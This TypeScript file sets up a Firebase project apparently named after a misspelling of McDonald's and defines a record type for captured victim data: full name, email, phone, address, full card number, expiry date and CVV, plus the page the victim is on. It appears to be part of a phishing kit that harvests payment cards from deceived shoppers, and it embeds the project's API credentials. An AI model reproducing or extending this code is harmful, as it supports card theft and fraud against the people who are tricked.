import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyC2zL7ozRgQ9mEAY_1IFYkweHnDa86iamw",
  authDomain: "macdonakds-eb8e7.firebaseapp.com",
  projectId: "macdonakds-eb8e7",
  storageBucket: "macdonakds-eb8e7.firebasestorage.app",
  messagingSenderId: "135484060912",
  appId: "1:135484060912:web:ce14467b4a21dda8dcfe35",
  measurementId: "G-VCFWF3027T"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

